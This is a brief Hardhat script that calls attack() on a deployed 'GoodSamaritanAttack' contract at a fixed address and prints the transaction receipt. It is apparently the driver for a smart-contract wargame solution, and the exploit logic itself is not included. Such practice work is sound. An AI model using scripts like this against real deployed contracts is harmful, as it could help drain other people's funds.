const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0xe8E6115405Cd121FFe963683cf5b05211FF0C124";

async function main() {
    const goodSamaritanAttacker = await ethers.getContractAt("GoodSamaritanAttack", ATTACKER_ADDRESS);

    // Execute the attack.
    const transferTx = await goodSamaritanAttacker.attack({gasLimit: 1000000});
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});